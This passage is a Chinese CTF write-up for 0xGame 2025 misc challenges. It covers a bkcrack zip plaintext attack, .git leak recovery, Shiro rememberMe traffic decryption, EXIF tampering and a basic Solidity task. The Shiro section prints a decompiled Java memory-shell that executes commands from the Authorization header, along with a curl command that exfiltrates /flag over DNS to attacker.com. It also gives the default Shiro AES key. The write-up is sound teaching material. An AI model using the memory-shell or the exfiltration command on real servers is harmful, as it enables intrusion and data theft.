100.0 % (9 / 9)
[13:59:25] Attack on 728540 Z values at index 6
Keys: cdc564be 5675041f 719adb56
25.0 % (181808 / 728540)
Found a solution. Stopping.
You may resume the attack with the option: --continue-attack 181808
[14:00:09] Keys
cdc564be 5675041f 719adb56
```

- step 4

接下来就是拿第三步得到的keys进行解密，读取flag，有多种方式

```
bkcrack -C attachment.zip -k cdc564be 5675041f 719adb56 -U flag.zip 123456
```

上述方式是将压缩包的密码改成123456重新打包，这样我们就用自己设置的密码解压即可

```
bkcrack -C attachment.zip -k cdc564be 5675041f 719adb56 -c flag.txt -d flag.txt && cat flag.txt
```

这个方式是直接将压缩包里面的文件进行提取，直接读

上面两个都差不多，要用到keys的，所以step2和3是我们进行明文攻击的关键

这里的明文攻击真的好有意思的，我为大家准备了一个稍微进阶的明文攻击题目，可以尝试解答下

[附件下载链接](https://www.ilanzou.com/s/OO9NiHas)

```text
前面的不知道，后面的也不知道，就只知道这几个明文字符，你有办法恢复出来吗？
0xGame{6?????????????mast??????????}
```

### 删库跑路

本题考察的是.git文件泄露，这个文件夹很关键，在后面学习信息搜集、渗透、或挖漏洞的时候，如果能拿到这个文件夹，那就赚了，因为里面包含项目的更改记录，完整文件内容也在里面呢。有的时候出题师傅会将flag编辑后，更新过仓库再删除，那么flag完全可以通过日志被恢复出来

因为.git文件夹里面的数据存储是zilb压缩，所以也不涉及解密什么的操作,给出一个解密照片

<img src="/assets/img/0xgame2025teching.assets/20251013231154_007.webp" alt="image-20251013212734416" style="zoom:50%;" />

但是为了更加方便快捷，直接按照仓库更新进行文件恢复，挺建议使用工具GitTools,项目地址https://github.com/internetwache/GitTools

<img src="/assets/img/0xgame2025teching.assets/20251013231154_008.webp" alt="image-20251007160318175" style="zoom:50%;" />

Look here，发现前后只有两次更新仓库

直接锁定main.py

<img src="/assets/img/0xgame2025teching.assets/20251013231154_009.webp" alt="image-20251007160427444" style="zoom:50%;" />

这里就是考察了下大家的代码审计能力，很轻松的，先进行凯撒加密，然后进行xor异或，最后是base64编码，我们解密的时候只需要倒过来操作即可

<img src="/assets/img/0xgame2025teching.assets/20251013231154_010.webp" alt="image-20251007162040142" style="zoom: 33%;" />

```python
#经供参考
import base64
xor_key=0x66
caser_shift=114514

def xor_bytes(data:bytes,key:int)->bytes:
	return bytes(b^key for b in data)

def caser_decrypt(text:str,shift:int) -> str:
	result=[]
	for char in text:
		if 'A' <=char<='Z':
			result.append(chr((ord(char)-ord('A')-shift)%26+ord('A')))
		elif 'a' <=char<='z':
			result.append(chr((ord(char)-ord('a')-shift)%26+ord('a')))

		else:
			result.append(char)
	return ''.join(result)

def main_decrypt():
	with open('output','r',encoding='ascii') as f:
		content=f.read().strip()
	step3_bytes=base64.b64decode(content.encode('ascii'))
	step2_bytes=xor_bytes(step3_bytes,xor_key)
	step2_str=step2_bytes.decode('utf-8')
	flag=caser_decrypt(step2_str,caser_shift)

	print(flag)

if __name__=="__main__":
	main_decrypt()
```

### ezShiro

> 基础的shiro流量解密还有dns记录

#### how to solve

下次遇到流量分析中出现rememberMe的时候，应当想到shiro加密流量，下面我仅仅讲述解题步骤

推荐在线工具https://potato.gold/navbar/tool/shiro/ShiroTool.html

*原理我会在最下面简单讲讲*

首先追踪第一个http流

<img src="/assets/img/0xgame2025teching.assets/20251013231155_011.webp" alt="image-20251007213345141" style="zoom:50%;" />

会看到很长的请求包

<img src="/assets/img/0xgame2025teching.assets/20251013231155_012.webp" alt="image-20251007213849145" style="zoom:50%;" />

将对应的Cookie复制到在线工具中，然后输入密钥`kPH+bIxk5D2deZiIxcaaaA==`（这是一种约定俗成或者说是默认的密钥，下次遇到这类题，如果密钥不对，那么可能考察的是密钥爆破，具体的问题可以自行研究

![image-20251007213827153](/assets/img/0xgame2025teching.assets/20251013231152_000.webp)

最下面出现了反编译的结果

```java
package com.summersec.x;

import java.util.Scanner;
import java.util.List;
import java.lang.reflect.Field;
import org.apache.shiro.codec.Base64;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

public class Test422640791304000 extends AbstractTranslet
{
    private static void writeBody(final Object o, final byte[] array) throws Exception {
        final byte[] bytes = new StringBuffer().append("$$$").append(Base64.encodeToString(array)).append("$$$").toString().getBytes();
        try {
            final Class forName = Class.forName("org.apache.tomcat.util.buf.ByteChunk");
            final Object instance = forName.newInstance();
            forName.getDeclaredMethod("setBytes", byte[].class, Integer.TYPE, Integer.TYPE).invoke(instance, bytes, new Integer(0), new Integer(bytes.length));
            o.getClass().getMethod("doWrite", forName).invoke(o, instance);
        }
        catch (final Exception ex) {
            final Class forName2 = Class.forName("java.nio.ByteBuffer");
            o.getClass().getMethod("doWrite", forName2).invoke(o, forName2.getDeclaredMethod("wrap", byte[].class).invoke(forName2, bytes));
        }
    }
    
    private static Object getFV(final Object o, final String s) throws Exception {
        Field declaredField = null;
        Class clazz = o.getClass();
        while (clazz != Object.class) {
            try {
                declaredField = clazz.getDeclaredField(s);
                break;
            }
            catch (final NoSuchFieldException ex) {
                clazz = clazz.getSuperclass();
            }
        }
        if (declaredField == null) {
            throw new NoSuchFieldException(s);
        }
        declaredField.setAccessible(true);
        return declaredField.get(o);
    }
    
    public Test422640791304000() throws Exception {
        boolean b = false;
        final Thread[] array = (Thread[])getFV(Thread.currentThread().getThreadGroup(), "threads");
        for (int i = 0; i < array.length; ++i) {
            final Thread thread = array[i];
            if (thread != null) {
                final String name = thread.getName();
                if (!name.contains("exec") && name.contains("http")) {
                    final Object fv = getFV(thread, "target");
                    if (fv instanceof Runnable) {
                        Object fv2;
                        try {
                            fv2 = getFV(getFV(getFV(fv, "this$0"), "handler"), "global");
                        }
                        catch (final Exception ex) {
                            continue;
                        }
                        final List list = (List)getFV(fv2, "processors");
                        for (int j = 0; j < list.size(); ++j) {
                            final Object fv3 = getFV(list.get(j), "req");
                            final Object invoke = fv3.getClass().getMethod("getResponse", (Class[])new Class[0]).invoke(fv3, new Object[0]);
                            final String s = (String)fv3.getClass().getMethod("getHeader", String.class).invoke(fv3, new String("Host"));
                            if (s != null && !s.isEmpty()) {
                                invoke.getClass().getMethod("setStatus", Integer.TYPE).invoke(invoke, new Integer(200));
                                invoke.getClass().getMethod("addHeader", String.class, String.class).invoke(invoke, new String("Host"), s);
                                b = true;
                            }
                            final String s2 = (String)fv3.getClass().getMethod("getHeader", String.class).invoke(fv3, new String("Authorization"));
                            if (s2 != null && !s2.isEmpty()) {
                                final String decodeToString = Base64.decodeToString(s2.replaceAll("Basic ", ""));
                                writeBody(invoke, new Scanner(new ProcessBuilder(System.getProperty("os.name").toLowerCase().contains("window") ? new String[] { "cmd.exe", "/c", decodeToString } : new String[] { "/bin/sh", "-c", decodeToString }).start().getInputStream()).useDelimiter("\\A").next().getBytes());
                                b = true;
                            }
                            if (b) {
                                break;
                            }
                        }
                        if (b) {
                            break;
                        }
                    }
                }
            }
        }
    }
}
```

审计代码后，发现这个Java🐎就干了这些事

**Header 检测:**

- 代码尝试获取 **`Host`** 头部，如果存在，则返回 `200` 状态码和 `Host` 头部，作为**连通性/身份验证**的信号。
- 代码尝试获取 **`Authorization`** 头部。

**命令执行:**

- `Base64.decodeToString(s2.replaceAll("Basic ", ""))`: 对 `Authorization` 头部的值进行 **Base64 解码**，这个解码后的字符串就是攻击者想要执行的**操作系统命令**。
- `new ProcessBuilder(...) .start()`: 根据操作系统（Windows 使用 `cmd.exe /c`，其他使用 `/bin/sh -c`），执行解码后的命令。
- **回显 (`writeBody`):** 命令执行的结果（`InputStream`）被读取，然后通过 **`writeBody`** 方法写入到 HTTP **响应体**中。
  - `writeBody` 通过反射调用容器的内部方法 (`doWrite`)，将结果用 `$$$...$$$` 封装后 **Base64 编码**发送回攻击者。

说简单点，就是hacker的命令会在Authorization部分，然后回显会用$$$...$$$包裹，里面的重要信息全用base64编码

下面我图上标注的够清晰了吧

![image-20251007215907167](/assets/img/0xgame2025teching.assets/20251013231153_001.webp)

> 如果对于上面的代码审计部分感觉很吃力，可以暂时放放，毕竟这个题不是一定要解密内存马才能解决的，发现上面的规律就能继续解题

流量包不多，解密的时候会看到这个的

```bash
~$ echo Y3VybCAkKGNhdCAvZmxhZyB8IHJldiB8IHRyICdBLVphLXonICdOLVpBLU1uLXphLW0nIHwgYmFzZTY0IHwgdHIgLWQgJ1xuJykuYXR0YWNrZXIuY29t | base64 -d
curl $(cat /flag | rev | tr 'A-Za-z' 'N-ZA-Mn-za-m' | base64 | tr -d '\n').attacker.com
```

这个命令的意思是访问一个子域名，然后域名的前缀是用一系列命令得到的：

`cat flag->rev(翻转输出)->进行rot13移位->base64编码->删除换行符`

解密就倒着来即可，先说说密文在哪里

我们观察到命令执行后，目标服务器上**没有产生完整的 HTTP 或 TCP 连接流量**，这表明数据没有通过传统信道（如 HTTP 回显）返回。

这是因为在流量抓包中，流量协议会将访问某个子域名的流量定义为dns流量，就是说服务器访问域名的时候，需要先本地进行dns解析，然后才能进行后续的交互，hacker就是利用这一点，将密文给用dns流量传递出来了

<img src="/assets/img/0xgame2025teching.assets/20251013231155_013.webp" alt="image-20251007221525697" style="zoom:50%;" />

```
fTBlMXVGX2dmaFd7cnpuVGswCg==
```

解密脚本

<img src="/assets/img/0xgame2025teching.assets/20251013231156_014.webp" alt="image-20251007222539796" style="zoom:50%;" />

有个更轻松的方法

```bash
$ echo fTBlMXVGX2dmaFd7cnpuVGswCg== | base64 -d | tr 'A-Za-z' 'N-ZA-Mn-za-m' | rev
0xGame{Just_Sh1r0}
```

#### 一些拓展...

> 关于shiro反序列化漏洞的原理以及一步一步解密，对大家来说较难，所以不做要求，可以看看

首先要对Apache shiro反序列化漏洞利用有所了解（通常被称为 **Shiro-550** 和 **Shiro-721** 漏洞）

该漏洞的核心在于 Apache Shiro 框架的 **“Remember Me”**（记住我）功能。

当用户勾选“记住我”登录时，Shiro 会执行以下操作：

1. 将用户的身份信息（一个实现了 `Serializable` 接口的对象，如 `Principal`）进行 **Java 序列化**。
2. 对序列化后的数据进行 **AES 加密**。
3. 对密文进行 **Base64 编码**。
4. 将最终的 Base64 字符串作为 **`rememberMe` Cookie** 的值发送给客户端。

当客户端带着这个 `rememberMe` Cookie 访问服务器时，服务器会执行逆向操作：**Base64 解码 → AES 解密 → Java 反序列化**。

攻击者利用的就是中间的AES加密密钥和最后的Java反序列化过程，来rce执行命令

> 如果上面有疑惑的话，对本题影响不大，推荐这个[webshell工具](https://github.com/SummerSec/ShiroAttack2)，可以玩玩

总之，这里的解密过程就是Base64→ AES → Java 反序列化

然后我们需要一些关键信息，比如说AES的密钥，在早期shiro框架，这个密钥是默认固定的`kPH+bIxk5D2deZiIxcaaaA==`,在正常解密shiro流量时，我们还需要尝试爆破密钥，但在本题中，直接拿来用即可

然后还需要aes加密的iv向量，默认是base64解码后的前16个字节

```python
import base64
from Crypto.Cipher import AES
import os

def decrypt_data(encrypted_b64, key_b64):
    try:

        encrypted_data = base64.b64decode(encrypted_b64)
        print(f"Base64解码后数据长度: {len(encrypted_data)} 字节")

        key = base64.b64decode(key_b64)
        print(f"AES密钥长度: {len(key)} 字节")

        iv = encrypted_data[:16]
        print(f"IV (十六进制): {iv.hex()}")

        actual_encrypted_data = encrypted_data[16:]
        print(f"实际加密数据长度: {len(actual_encrypted_data)} 字节")

        cipher = AES.new(key, AES.MODE_CBC, iv)

        decrypted_data = cipher.decrypt(actual_encrypted_data)

        unpadded_data = unpad_pkcs7(decrypted_data)
        
        return unpadded_data
        
    except Exception as e:
        print(f"解密过程中出现错误: {e}")
        return None

def unpad_pkcs7(data):

    padding_length = data[-1]
    return data[:-padding_length]

def save_to_file(data, filename):

    try:
        with open(filename, 'wb') as f:
            f.write(data)
        print(f"解密结果已保存到: {filename}")
        return True
    except Exception as e:
        print(f"保存文件时出现错误: {e}")
        return False

def main():
    encrypted_b64 = input("请输入base64编码的加密数据: ").strip()
    key_b64 = input("请输入base64格式的AES密钥: ").strip()
    output_filename = input("请输入输出文件名(默认: decrypted_result.bin): ").strip()
    
    if not output_filename:
        output_filename = "decrypted_result.bin"
    print("开始解密...")
    decrypted_data = decrypt_data(encrypted_b64, key_b64)
    
    if decrypted_data is not None:
        print(f"\n解密成功!")
        print(f"解密数据长度: {len(decrypted_data)} 字节")
        print(f"解密数据前16字节(十六进制): {decrypted_data[:16].hex()}")

        try:
            text_output = decrypted_data.decode('utf-8')
            print(f"文本内容预览: {text_output[:100]}...")
        except:
            print("解密结果包含二进制数据，无法显示为文本")

        if save_to_file(decrypted_data, output_filename):
            print(f"\n文件已保存为: {output_filename}")
        else:
            print("文件保存失败")
    else:
        print("解密失败")

if __name__ == "__main__":
    main()
```

这是解密后得到的文件

```bash
$ file decrypted_result.bin
decrypted_result.bin: Java serialization data, version 5
```

可以看出，这是Java序列化文件，是个二进制文件，不好分析，我们只能先通过反序列化处理，但是也就是这一点最难

> 可惜我还没学会这种文件的分析处理~~（在学了，在学了~~
>
> ~~所以还是回到那个在线解密工具吧~~

~~在线shiro解密工具https://potato.gold/navbar/tool/shiro/ShiroTool.html~~

学会咯，感谢spreng，他教会我怎么处理一个Java序列化文件

![thanks](/assets/img/0xgame2025teching.assets/thanks.gif)

首先，我们可以在序列化文件中提取class，这一步难度不大，python脚本可以实现

```python
import javaobj


def putsMessage(obj):
    print(f"类: {obj.classdesc}")
    print(f"注解: {obj.annotations}")
    print(
        f"私有属性: {[i for i in dir(obj) if i.startswith('_') and not i.startswith('__')]}"
    )
    print(f"公有属性: {[i for i in dir(obj) if not i.startswith('_')]}")


with open("decrypted_result.bin", "rb") as f:

    parser = javaobj.JavaObjectUnmarshaller(f)
    try:
        obj = parser.readObject()
        putsMessage(obj)
        putsMessage(obj.annotations[1])

        print(len(obj.annotations[1]._bytecodes[0]))
        with open("shiro_payload_output.class", "wb") as f2:
            for i in obj.annotations[1]._bytecodes[0]:
                f2.write(int.to_bytes((i + 256) % 256, 1))

    except EOFError:
        print("文件解析完成")
```

接着，我们需要使用crf.jar进行反编译（神器，如果找不到，下载[我的crf](https://www.alipan.com/s/1n8e679GWu5)

```bash
java -jar cfr.jar shiro_payload_output.class > output.java
```

反编译出来的结果很清晰

![image-20251008113818934](/assets/img/0xgame2025teching.assets/20251013231153_003.webp)

![image-20251008113835006](/assets/img/0xgame2025teching.assets/20251013231153_004.webp)

一些必要的细节都有

> 由于设备差异吧，我上面用脚本提取class的时候，代码已经足够清晰了，甚至下面的crf操作也仅仅是换了个变量名的样子，对了，我用的python库的名称是javaobj-py3

### ezEXIF

> 信息伪造题目，涉及一定的图片宽高修改

先说说图片宽高吧，由于这些都是“规定”（别问我为啥是这样昂

#### 图片宽高更改

- png
- - 首先用010锁定ihdr块，然后手动编辑，width对应的宽度，height对应的高度，更改数字即可

<img src="/assets/img/0xgame2025teching.assets/20251013231156_015.webp" alt="image-20251008000130599" style="zoom:50%;" />

- jpg
- - 用010锁定sof0数据块，图片的宽高在这里控制，同样直接更改数字，然后保存即可

<img src="/assets/img/0xgame2025teching.assets/20251013231156_016.webp" alt="image-20251008000417847" style="zoom:50%;" />

- gif
- - 用010查看LogicalScreenDescriptor，下面的Width和Height控制的就是宽高

<img src="/assets/img/0xgame2025teching.assets/20251013231156_017.webp" alt="image-20251008000700068" style="zoom:50%;" />

> 上面的三种宽高更改，某种意义上，其实并不一样，比方说png改变宽高，仅仅是对应的画面消失，然而其他部分没有改变，jpg的话，一旦更改宽高，哪怕很细微，对图片的损伤也很大，里面的原由，希望大家能在学习对应的文件结构时，留意下细节，比如说png是一种流加密存储......

#### exif信息篡改

不得不说，exiftool工具最好用

```
exiftool -Make="Hacker" \
		 -Model="Kali linux" \
		 -DateTimeOriginal#="9999:99:99 66:66:66" \
		 -Description="motto:I can be better!"\
		 00.png
```

再将宽高更改后，提交就能拿到flag

<img src="/assets/img/0xgame2025teching.assets/20251013231156_018.webp" alt="image-20251008002544489" style="zoom:50%;" />

### ezChain

> 最简单的上链，主要是想让新生理解区块链题目怎么上手，部署合约

正常来说，解决区块链题目，我们会至少拿到四个重要信息

第一个是rpc链，大部分题目应该是部署私链上进行的，需要进行网络配置

第二个是合约地址，这是我们完成挑战必须拿到的重要信息

第三个是水龙头，我们需要通过出题人提供的水龙头获取部分测试币，合约部署还有交易等，都需要gas费用，但是本题不太一样，会提供一个私钥，题目会自动给这个私钥的账户上充1eth,足够后面的部署等费用了

最后就是关键的挑战合约了，sol语法难易上还好，就那几个常用的，多见就会读会写了

#### how to solve

> 下面举例用这个环境进行

<img src="/assets/img/0xgame2025teching.assets/20251013231157_019.webp" alt="image-20251008004607202" style="zoom:33%;" />

```python
RPC_URL = "http://47.122.65.230:48334/65a7edf6-c415-4105-a26b-36f70f7913e6"
PRIVKEY = "fa7d264c487617dc552c2f0186111d321fc380762673e2ea6ce4973205ee9992"
SETUP_CONTRACT_ADDR = "0x074688F8E6f147502450B36f5eAa7CC3c3BAbA35"
WALLET_ADDR = "0x75248DebE8531030d4CDe342A5eBE8E7De5F4778"
```

- 一些准备

首先需要在浏览器上安装**`metamask`**插件，几乎每家浏览器都有这个的

![image-20251008003645578](/assets/img/0xgame2025teching.assets/20251013231153_005.webp)

接下来就是注册，创建新钱包，这些不做截图

- 配置rpc

第一次登录，会自动连接以太主网，有两个方式：

- - 使用魔法

<img src="/assets/img/0xgame2025teching.assets/20251013231157_020.webp" alt="image-20251008004207827" style="zoom: 25%;" />

点击左上角的Ethereum Mainnet,会进入选择网络的功能，选择添加自定义网络

- - 等待一会儿

出现切换网络.jpg(没截图)

点击后，弹窗样子和上面的那个图片是一样的

<img src="/assets/img/0xgame2025teching.assets/20251013231157_021.webp" alt="image-20251008004542515" style="zoom:50%;" />

<img src="/assets/img/0xgame2025teching.assets/20251013231157_022.webp" alt="image-20251008004720374" style="zoom:50%;" />

这里随便填，没出现红色就没错

<img src="/assets/img/0xgame2025teching.assets/20251013231157_023.webp" alt="image-20251008004823736" style="zoom:50%;" />

关于这里的链ID，你随便输入1个数字，会自动弹出正确的链id，就长这样，改回去即可

<img src="/assets/img/0xgame2025teching.assets/20251013231157_024.webp" alt="image-20251008004913872" style="zoom: 50%;" />

最后保存了，才算rpc配置成功

- 使用私钥添加用户

<img src="/assets/img/0xgame2025teching.assets/20251013231157_025.webp" alt="image-20251008005042952" style="zoom:50%;" />

<img src="/assets/img/0xgame2025teching.assets/20251013231157_026.webp" alt="image-20251008005104166" style="zoom:50%;" />

<img src="/assets/img/0xgame2025teching.assets/20251013231157_027.webp" alt="image-20251008005131514" style="zoom:50%;" />

将private key复制进去，导入即可，可以看到，已经有初始余额1ctf了

<img src="/assets/img/0xgame2025teching.assets/20251013231158_028.webp" alt="image-20251008005238744" style="zoom:50%;" />

- 部署合约

接下来需要使用在线ide - [remix](https://remix.ethereum.org/)

metamask在哪个浏览器，就在哪个浏览器上访问

新建个sol文件，将题目下发的Setup.sol复制进去，文件名也要一样的喔，这里设计合约里面的合约名，总之就是要一样

<img src="/assets/img/0xgame2025teching.assets/20251013231158_029.webp" alt="image-20251008005856453" style="zoom:50%;" />

然后进行编译，部署

<img src="/assets/img/0xgame2025teching.assets/20251013231158_030.webp" alt="image-20251008005943306" style="zoom:50%;" />

<img src="/assets/img/0xgame2025teching.assets/20251013231158_031.webp" alt="image-20251008010105311" style="zoom: 50%;" />

这里进行部署，需要先设置环境，选中浏览器插件-->Injected Provider-MetaMask会自动关联当前钱包用户以及对应网络，然后再将合约地址复制过来，粘贴到At Address中，点击即可（要大致理解，我们的挑战合约应该部署到题目下发的那个地址，不然我们要是成功了，题目怎么判定呢？



{% raw %}
```liquid
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract Setup {
    bool private solved;
    string private constant WINNING_PHRASE = "welcome_to_0xGame2025";

    constructor() payable {
    }

    function solve(string memory phrase) public {
        if (keccak256(abi.encodePacked(phrase)) == keccak256(abi.encodePacked(WINNING_PHRASE))) {
            solved = true;
        } else {
            revert("Setup: Incorrect phrase.");
        }
    }

    function isSolved() external view returns (bool) {
        return solved;
    }

    receive() external payable {}
}
```
{% endraw %}




- 审计合约完成挑战

读完挑战合约，就考察了一点，就是选手需要提交一个字符串`welcome_to_0xGame2025`，只有这样，才能让solved返回true，才算完成了挑战（真的是简单上链吧，算是0xgame2025teching.assets的一个签到题

<img src="/assets/img/0xgame2025teching.assets/20251013231158_032.webp" alt="image-20251008011336047" style="zoom:50%;" />

<img src="/assets/img/0xgame2025teching.assets/20251013231158_033.webp" alt="image-20251008011354650" style="zoom:50%;" />

> 这是区块链上最最基础的知识（没有涉及任何区块链安全，区块链还是很有意思的，在国外赛事或国内大型赛事中会经常看到blockchain，这个赛道相对来说，确实很新很难，如果大家后面打算专攻misc，可以对区块链研究一二，相信会有人体会到区块链的魅力的

<div align="left">
<img src="/assets/img/0xgame2025teching.assets/20251013231159_034.webp" alt="完结撒花" style="width:30%;">
</div>

